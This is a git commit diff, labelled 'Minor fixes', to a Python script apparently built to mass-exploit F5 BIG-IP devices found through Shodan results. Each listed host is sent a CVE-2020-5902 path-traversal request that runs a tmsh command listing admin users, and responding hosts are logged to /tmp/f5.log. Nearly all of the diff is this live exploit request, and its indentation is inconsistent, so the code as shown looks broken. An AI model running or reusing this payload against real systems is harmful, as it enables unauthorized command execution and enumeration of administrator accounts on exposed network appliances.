87acb54710b93e92c075a2d7e00e6a341de7bfb0
cbk914 <cbk914@riseup.net>
2020-07-16 15:56:37 +0200

    Minor fixes

--- F5-BIG-IP/F5.py
+++ F5-BIG-IP/F5.py
@@ -30,13 +30,13 @@ try:
 		http_type = "http"
     	PAYLOAD = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin" # CVE-2020-5902
     	CVE = "CVE-2020-5902"
-		rawBody = "`{""}`"
-		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+""+PAYLOAD+"","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
-		response = session.post(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"", data=rawBody, headers=headers, verify=False)
+	rawBody = "`{""}`"
+	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+""+PAYLOAD+"","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
+	response = session.post(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"", data=rawBody, headers=headers, verify=False)
 	if response.status_code == 200:
 			print ("[*]Found F5 device potentially vulnerable to "+CVE+" ... Logging to file.[*]")
-	    	text_file.open("/tmp/f5.log")
-            text_file.write(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"\n")
+			text_file.open("/tmp/f5.log")
+        		text_file.write(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"\n")
 			text_file.close()
 	else:
 			print ("[*]F5 BIG IP Not detected[*]")
@@ -57,10 +57,10 @@ try:
         
         # Loop through the matches and print each IP
 		for service in result['matches']:
-				IP = str(service['ip_str'])
-				PORT = str(service['port'])
+			IP = str(service['ip_str'])
+			PORT = str(service['port'])
                 CC = service['location']['country_name']
-				checks (IP,PORT,CC)
+		checks (IP,PORT,CC)
 except KeyboardInterrupt:
 		print ("Ctrl-c pressed ...")
 		sys.exit(1)
